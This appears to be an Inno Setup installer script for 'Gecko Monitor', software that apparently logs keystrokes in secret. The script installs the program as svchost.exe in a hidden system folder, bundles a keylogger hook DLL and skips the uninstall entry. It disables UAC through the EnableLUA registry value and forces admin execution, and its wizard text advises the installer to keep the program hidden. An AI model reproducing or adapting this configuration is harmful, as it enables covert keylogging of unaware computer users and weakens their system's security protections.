[Setup]
AppName=Gecko Monitor
AppVersion=1.00
CreateUninstallRegKey=no
UninstallFilesDir={app}
UninstallDisplayName=Gecko Monitor
DefaultDirName={syswow64}\catroot\{{GEC0AA1D-4E63-1461-3746-00D04AB326FF}
Compression=lzma2                     
SolidCompression=yes
OutputDir=.\
OutputBaseFilename=install_gecko
AppMutex=GeckoInstanceController
WizardImageFile=_material\installer-1.bmp
WizardSmallImageFile=_material\installer-2.bmp
DisableProgramGroupPage=yes
PrivilegesRequired=admin
LicenseFile=license.txt

[Files]
Source: "..\monitor\Win32\Debug\GeckoMonitor.exe"; DestDir: "{app}"; DestName: "svchost.exe"
Source: "..\monitor\modules\keylogger\keyhook\Win32\Release\keyhook.dll"; DestDir: "{app}"
Source: "ssl\*.*"; DestDir: "{app}"

[Icons]
Name: "{commondesktop}\Gecko Monitor"; Filename: "{app}\svchost.exe"; Tasks: desktopicon

[Tasks]
Name: desktopicon; Description: "Create a desktop icon"
Name: disableuac; Description: "Disable UAC Notifications"

[Run]
Filename: "{app}\svchost.exe"; Description: "Launch Gecko Monitor"; Flags: postinstall nowait skipifsilent runascurrentuser

[Messages]
SelectDirBrowseLabel=To continue, click Next. If you would like to select a different folder, click Browse.%n%nIt is recommended that you install to this folder to hide Gecko Monitor efficiently.
SelectTasksLabel2=If you create a desktop icon it's recommended that you delete it after you become familiar with Gecko Monitor. This is to ensure the application stays hidden.%n%nIMPORTANT: Windows User Account Notifications are known to cause problems with Gecko Monitor when turned on. We highly recommend disabling UAC.%n%n(UAC Notifications are the pop-up windows that ask you if you want to allow a certain application to make changes, disabling them will make no changes to Windows and they can be turned back on at anytime via the control panel.)

[Registry]
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; ValueType: dword; ValueName: "EnableLUA"; ValueData: "0"; Tasks: disableuac
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"; ValueType: string; ValueName: "{app}\svchost.exe"; ValueData: "RUNASADMIN"
